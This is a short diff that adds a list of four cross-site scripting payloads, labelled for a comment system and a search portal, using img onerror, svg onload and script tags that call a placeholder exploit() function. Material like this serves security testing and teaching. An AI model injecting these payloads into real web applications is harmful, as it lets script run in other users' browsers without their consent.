@@ -1,0 +1,8 @@
+Payload 1 - Comment System:
+<img src=x onerror="exploit()">
+Payload 2 - Search Portal:
+<svg onload="exploit()">
+Payload 3 - Alternative:
+<script>exploit()</script>
+Payload 4 - Simple:
+<img src=x onerror=exploit()>
